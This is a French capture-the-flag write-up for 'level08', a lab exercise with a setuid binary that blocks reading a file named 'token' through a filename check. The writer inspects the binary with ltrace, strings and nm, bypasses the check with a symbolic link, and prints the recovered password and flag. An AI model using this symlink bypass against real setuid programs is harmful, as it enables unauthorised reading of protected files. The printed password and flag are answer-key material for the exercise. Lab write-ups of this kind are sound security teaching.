Le level08 nous fournis deux fichiers, le binaire level08 et le token.

```bash
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

Nous n'avons pas les droits pour le token. Mais on les a pour le level08.

En testant : `./level08 token` on obtient `You may not access 'token'`

Pour mieux comprendre comment marche le binaire, on a utilisé trois commandes :
`ltrace`, `strings` et `nm`

le ltrace nous donne :

```bash
__libc_start_main(0x8048554, 1, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)          = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
la commande strings : la commande strings nous fournis beaucoup d'informations qui nous servent pas vraiment sauf ces lignes la :

```bash
printf
strstr
read
open
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh
QVhT
UWVS
[^_]
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"
```

Pareil pour la commande nm :

```bash
08048554 T main
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U read@@GLIBC_2.0
         U strstr@@GLIBC_2.0
         U write@@GLIBC_2.0
```

Après lecture et analyse on déduit que le binaire ouvre un fichier avec open effectue un strstr et printf. strstr permet de trouver la premiere occurance d'une string.

Apres reflexion et un teste qui est `ltrace ./level08 .profile`

```bash
__libc_start_main(0x8048554, 2, 0xbffff794, 0x80486b0, 0x8048720 <unfinished ...>
strstr(".profile", "token")                         = NULL
open(".profile", 0, 014435162522)                   = 3
read(3, "# ~/.profile: executed by the co"..., 1024) = 675
write(1, "# ~/.profile: executed by the co"..., 675# ~/.profile: executed by the command interpreter for login shells.
```

On observe que strstr check le nom du fichier. Et on déduit apres un `ltrace ./level08 token`:

```bash
__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                            = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)        = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

Que strstr renvoi `null` si le nom du fichier != `token`

Donc pour exploiter cette faille on a utiliser un lien symbolique car si on ouvre un fichier avec un nom different qui pointe vers token ca permettrai en theorie d'avoir son contenu.

on test `ln -s ~/token /tmp/chocolat`.

Si on fait un cat sur /tmp/chocolat on nous renvera une erreur parce que on a pas les droits. Logique puisque c'est un lien symbolique sur token.

Mais en utilisant `./level08 /tmp/chocolat` on obtien `quif5eloekouj29ke0vouxean`

su flag08 quif5eloekouj29ke0vouxean

getflag -> `25749xKZ8L7DkSCwJkT9dyv6f`

Et ca fonctionne go next now.